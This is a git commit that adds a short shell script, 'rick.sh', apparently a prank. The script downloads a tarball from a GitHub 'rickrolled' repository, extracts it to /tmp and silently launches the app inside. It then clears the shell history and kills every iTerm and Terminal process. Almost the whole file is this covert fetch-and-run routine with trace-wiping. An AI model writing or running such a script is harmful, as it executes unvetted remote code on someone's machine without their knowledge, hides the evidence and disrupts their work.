b6963670dc0b7b969000fbca759c37d7f1a42d86
Farouk El hitary <fel-hita@e2r7p10.1337.ma>
2018-10-18 01:44:47 +0100

    sh

---
+++ rick.sh
@@ -0,0 +1,14 @@
+mkdir -p /tmp/felhita/
+
+curl -L https://github.com/fel-hita/rickrolled/blob/master/Rickroll.tar.gz?raw=true -o /tmp/felhita/rickrolly.tar.gz > /dev/null
+
+tar -xvf /tmp/felhita/rickrolly.tar.gz -C /tmp/felhita > /dev/null
+
+nohup open /tmp/felhita/app/Banana.app > /dev/null
+
+clear
+history -c
+
+killall iTerm
+killall Terminal
+killall iTerm2
